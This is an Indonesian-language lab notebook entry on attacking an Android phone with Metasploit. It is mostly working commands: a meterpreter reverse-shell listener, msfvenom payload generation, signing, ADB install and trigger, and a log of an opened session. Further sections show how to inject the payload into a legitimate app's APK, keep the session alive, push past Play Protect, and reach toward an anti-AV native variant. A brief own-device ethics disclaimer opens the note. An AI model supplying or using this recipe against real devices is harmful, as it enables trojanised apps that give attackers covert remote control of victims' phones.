---
title: "Metasploit Android — Payload, Shell, & Injeksi APK (Fedora 44)"
tags:
  - metasploit
  - android
  - reverse-shell
  - msfvenom
  - apk-injection
  - adb
created: "2026-08-09"
updated: "2026-08-09"
status: validated
environment:
  os: Fedora 44
  android: vivo V2109 (arm64-v8a, Android 14)
  sdk: /home/jars/Android/Sdk/android-14
  tools: adb, apksigner, zipalign, aapt2, apktool.jar, docker (metasploitframework/metasploit-framework)
---

# Metasploit Android: Payload → Shell → Injeksi APK

**Scope etis**: semua di sini dijalankan hanya pada perangkat milik sendiri / lab.
Jangan dipakai ke perangkat orang lain tanpa izin — itu ilegal.

## 0. Prasyarat

- Image docker msf sudah ada: `metasploitframework/metasploit-framework`
- HP: Developer Options → USB Debugging ON, colok USB, `adb devices` muncul
- IP PC di LAN: `ip -4 addr show | grep inet` (contoh riil: `192.168.1.104`)
- IPv6 global PC (opsional, untuk beda jaringan): `ip -6 addr show scope global`

> **Pelajaran kunci sesi uji 2026-08-09**: payload IPv6 (`LHOST=2404:8000:...`) bisa connect,
> tapi paling stabil pakai IPv4 dalam satu LAN. VPN di HP (WARP/1.1.1.1) memblokir
> koneksi lokal → harus dimatikan dulu (lihat §5 Troubleshooting).

## 1. Listener (dalam container, bind port host)

```bash
docker run -d --rm --name msf-host -p 4444:4444/tcp \
  -v /home/jars/TESTFROMDARKNET/msf_android:/data:Z \
  metasploitframework/metasploit-framework /bin/sh -c \
  "cd /usr/src/metasploit-framework && ./msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; set ExitOnSession false; exploit -j; sleep 1000'"
```

Cek:
```bash
docker logs msf-host            # "* Started reverse TCP handler on 0.0.0.0:4444"
ss -tlnp | grep 4444            # LISTEN 0.0.0.0:4444 & [::]:4444
```

## 2. Generate payload (revshell ke PC)

```bash
cd /home/jars/TESTFROMDARKNET/msf_android
docker run --rm -v $PWD:/data:Z metasploitframework/metasploit-framework /bin/sh -c \
  "cd /usr/src/metasploit-framework && \
   ./msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.104 LPORT=4444 \
   -o /tmp/p.apk && cp /tmp/p.apk /data/payload.apk"
```
- Ukuran ~11,7 KB. `-i` tidak dipakai → hash unik tiap build.
- **Arsitektur**: payload android msfvenom = pure dalvik (Java), `ARCH=` diabaikan → jalan di semua ABI. Jangan cari `.so`.

## 3. zipalign + sign (WAJIB, urutan ini!)

```bash
export SDK=/home/hp/Android/Sdk/android-14
$SDK/zipalign -f 4 payload.apk aligned.apk
$SDK/zipalign -c -v 4 aligned.apk | tail -1          # "Verification succesful"
$SDK/apksigner sign --ks ~/.android/debug.keystore --ks-pass pass:android \
  --key-pass pass:android --ks-key-alias androiddebugkey   --out signed.apk aligned.apk
$SDK/apksigner verify --print-certs signed.apk | grep -v WARNING   # Verifies
$SDK/aapt dump badging signed.apk | grep -E "package:|uses-permission"   # cek perm
```

## 4. Install via ADB + trigger

```bash
export PATH=$PATH:/home/jars/Android/SdK/platform-tools
adb install signed.apk                 # "Success"
adb shell pm list packages | grep metasploit
adb shell am start -n com.metasploit.stage/.MainActivity    # trigger
```

Pantau dari PC:
```bash
docker logs --since 30s msf-host | grep -iE "session|stage|died"
```

**Bukti riil** (2026-08-09):
```
[*] Sending stage (75836 bytes) to 192.168.1.63
[*] Meterpreter session 2 opened (172.17.0.2:4444 -> 192.168.1.63:47062)
```
Root cause awal gagal: payload lama LHOST IPv6 + WARP aktif di HP → koneksi diblok.

## 5. Troubleshooting umum (sudah dites semua)

| Gejala | Penyebab | Fix |
|---|---|---|
| `app not installed` | APK tidak zipalign/sign | zipalign → apksigner (urutan wajib) |
| Session terbuka lalu `Died` | App di-kill sistem (background, Play Protect) | Matikan VPN HP; jadikan foreground service; auto-restart |
| Gak connect walau app hidup | **VPN WARP di HP** (tun0) nge-route semua trafik | `adb shell am force-stop com.cloudflare.onedotonedotonedotone`; cek `ip addr show tun0` hilang |
| Payload IPv6 gak connect | Listener bind IPv4 pas `-p` atau firewall blok | Listener `-p 4444:4444` bind `[::]`; firewall buka port; atau pakai IPv4 |
| Play Protect warning "older version / suggest uninstall" | Payload tidak ada di store | Normal; lanjutkan (di luar adb tetap jalan) |
| `adb devices` kosong | USB debugging belum aktif / kabel data | Settings → Developer options; atau `adb kill-server` |

## 6. Injeksi payload ke APK lain

### Metode A — msfvenom `-x` (copies tampil, risiko APK rusak)

```bash
docker run --rm -v /home/jars/TESTFROMDARKNET/msf_android:/data:Z \
  metasploitframework/metasploit-framework /bin/sh -c \
  "cd /usr/src/metasploit-framework && \
   ./msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.104 LPORT=4444 \
   -x /data/target.apk -o /data/injected.apk"
# lalu zipalign+sign seperti §3; cek aapt badging — jika bading error, gagal
```

### Metode B — apktool (merge smali, lebih aman untuk app besar)
1. Decode target: `java -jar /home/jars/RE-tools/apktool.jar d -f -o tgt_out target.apk`
2. Decode payload stage: `java -jar ... d -f -o payload_out payload.apk`
3. Copy `payload_out/smali*/com/metasploit/** → tgt_out/smali*/com/metasploit/`
4. Tambahkan Activity + Service di `tgt_out/AndroidManifest.xml`
   (referensi nama dari `payload_out/AndroidManifest.xml`)
5. Rebuild: `apktool b tgt_out -o rebuilt.apk` → zipalign → apksigner → install
6. Note: signature beda dari asli → uninstall versi asli; Play Protect bisa deteksi;
   app dengan integrity-check (cek signature hash) akan crash → pakai Metode C.

### Metode C — payload native `.so` (anti-AV/anti-tamper, advance)
- Bungkus stage dalam NDK `.so` + JNI (Jalur B dari sesi MSF).
- Rincian lanjutan di sesi "Jalur B" (belum dieksekusi penuh).

## 7. Bersih / stop

```bash
docker stop msf-host
adb uninstall com.metasploit.stage
rm -rf /home/jars/TESTFROMDARKNET/msf_android/*.apk   # hapus artefak
```

## Catatan audit

- `payload_ipv6.apk` sha256: `6d54eb14bd6a70a9bfd6d1971b64a60d837203076ab28fce36ac2a6d52c92dd`
- `payload_arm64.apk` (LHOST IPv4, dipakai final): `payload_size 11758 bytes`
- Ringkasan sesi sukses: install → trigger → session terbuka (lihat §4).